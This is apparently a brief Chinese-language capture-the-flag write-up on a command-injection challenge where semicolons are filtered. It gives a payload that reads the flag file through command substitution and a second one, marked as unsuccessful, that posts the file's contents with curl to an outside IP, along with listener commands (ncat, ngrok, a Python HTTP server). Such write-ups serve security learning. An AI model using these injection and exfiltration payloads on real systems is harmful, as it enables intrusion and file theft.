http://splitline.tw:8301/


問題:
1.分號被擋掉
2. system 只會為傳stdout 的內容, ls /的指令太長 , 皆在host後面只會噴stderr,
stderr 的話system 就不會print出來

解法一:
1. '"$(cat /f*)"'
解法二:
2. 把東西傳出去(沒試成功)
'"$(curl 140.113.213.75:7414 --data $(cat /f*))"'


tool:
create server:
1. python3 -m http.server  9999 
2. ncat -klvp 7414
3. ngrok http 5000